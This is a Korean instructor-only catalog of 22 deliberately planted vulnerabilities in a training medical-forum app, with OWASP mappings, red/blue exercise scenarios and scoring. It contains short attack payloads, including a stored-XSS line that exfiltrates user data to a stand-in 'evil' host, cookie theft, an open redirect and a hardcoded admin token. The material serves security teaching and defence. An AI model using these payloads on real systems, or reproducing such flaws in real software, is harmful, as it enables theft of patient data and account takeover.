# MediForum — 22 취약점 카탈로그

> ⚠️ 강사·평가자 전용. 의료 익명 커뮤니티 의도적 취약 시스템.

## 강조 영역
Stored XSS (post / comment / profile / DM / SVG) · CSRF · PII overshare · Broken API auth · IDOR

## 매핑

| # | 코드 | OWASP | 카테고리 | 위치 | PoC |
|---|------|-------|----------|------|-----|
| 1 | V01 | A03 Injection | Stored XSS — 게시글 본문 | `POST /posts/new` body | `<img src=x onerror=alert(1)>` |
| 2 | V02 | A03 Injection | Stored XSS — 댓글 | `POST /posts/<id>/comment` body | `<svg/onload=fetch('/api/users').then(r=>r.json()).then(j=>fetch('//evil/'+btoa(JSON.stringify(j))))>` |
| 3 | V03 | A03 Injection | Stored XSS — profile bio / display_name | `POST /profile/edit` | `<script>document.cookie=...</script>` |
| 4 | V04 | A08 Integrity | CSRF — post 작성 (토큰 0) | `POST /posts/new` | 외부 sites form auto-submit |
| 5 | V05 | A08 Integrity | CSRF — 댓글 작성 | `POST /posts/<id>/comment` | 외부 fetch + cookie 전송 |
| 6 | V06 | A08 Integrity | CSRF — profile 수정 | `POST /profile/edit` | role=admin 자동 변경 |
| 7 | V07 | A02 Crypto/PII | PII bulk leak — 인증 0 | `GET /api/users` | 전체 email/phone/ssn/api_key 평문 |
| 8 | V08 | A01 BAC | medical-records 전체 인증 0 | `GET /api/medical-records` | 모든 환자 진단/처방 노출 |
| 9 | V09 | A01 BAC | IDOR — 다른 환자 record | `GET /api/medical-records/<id>` | `/api/medical-records/2` 임의 조회 |
| 10 | V10 | A07 AuthFail | Broken admin API auth | `GET /api/admin/users`, `/api/admin/dms` | 인증 없이 모든 사용자/DM 덤프 |
| 11 | V11 | A09 Logging / A02 | API key in URL query | `GET /api/users/<id>?api_key=...` | 액세스 로그·referer leak |
| 12 | V12 | A05 Misconfig | 세션 쿠키 HttpOnly/Secure 미설정 | response `Set-Cookie: MFSID=...` | XSS → document.cookie 탈취 |
| 13 | V13 | A05 Misconfig | CORS `*` + credentials | 모든 응답 헤더 | 외부 origin 에서 자격증명 요청 가능 |
| 14 | V14 | A02 Crypto | 예측가능 session id (counter) | `MFSID=sess-1001` | 다음 sid `sess-1002` brute |
| 15 | V15 | A07 AuthFail | Email enumeration | `POST /register` | "이미 사용 중" → 등록자 추측 |
| 16 | V16 | A02 Crypto/PII | search 결과에 SSN/phone/api_key 포함 | `GET /search?q=` | 의사/환자 검색 → PII bulk |
| 17 | V17 | A01 BAC | Mass assignment — role/verified 변조 | `POST /profile/edit` 또는 `POST /api/profile` | `{"role":"admin","verified":1}` |
| 18 | V18 | A03 Injection | Stored XSS in DM | `POST /dm/send` body | 받는이가 `/dm` 열면 trigger |
| 19 | V19 | A03 / A09 | XSS via SVG avatar 업로드 | `POST /profile/avatar` | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>` 직접 반환 |
| 20 | V20 | A10 SSRF계열 | Open redirect | `GET /go?to=//evil.example` | phishing redirect chain |
| 21 | V21 | A09 Logging | Verbose error — stack trace | `GET /api/debug/echo?q=` | 환경/스택 노출 |
| 22 | V22 | A07 AuthFail | Hardcoded admin token | `X-Admin-Token: MEDIFORUM-ADMIN-2026-DEV` | 모든 admin endpoint 통과 |

## 권장 공방 시나리오 (Battle 기준)

| 단계 | 공격 (RED) | 방어 (BLUE) |
|------|-----------|-------------|
| 정찰 | `/api/users` PII 덤프 / V21 stack | API auth 추가, error redact |
| XSS chain | V01 게시글에 `<script>` → 의사 세션 탈취 (V12 cookie httpOnly 미설정) | DOMPurify, CSP 헤더, HttpOnly+Secure |
| PII 탈취 | V07 + V08 + V09 IDOR + V16 search | RBAC + 응답 마스킹, 의료 record patient_id 검증 |
| 권한 상승 | V06 CSRF + V17 mass assign role=admin | CSRF 토큰, allowlist 필드 |
| Admin takeover | V22 hardcoded token + V10 admin endpoint | 토큰 제거, JWT/RBAC, 별도 admin SSO |
| Phishing chain | V20 open redirect → fake login | redirect allowlist (host whitelist) |

## 점수 가중

| 난이도 | claim 점수 | 사례 |
|--------|-----------|------|
| Trivial | +5 | V11 query api_key, V21 verbose error |
| Easy | +10 | V01 stored XSS, V07 PII dump, V13 CORS |
| Medium | +20 | V08 medical-records, V09 IDOR, V18 DM XSS, V19 SVG |
| Hard | +30 | V17 mass assign role, V22 admin token discovery, V20 chain |
| Chain | +40 | V01 XSS → V12 cookie 탈취 → V17 role=admin → V10 admin dump |

## 운영자 점검
- 실행: `python app.py` (port 3003)
- 시드: admin / dr.kim / dr.lee / alice / bob / carol
- DB 초기화: `mediforum.db` 삭제 후 재실행
- uploads: `./uploads/` (SVG XSS 테스트용)
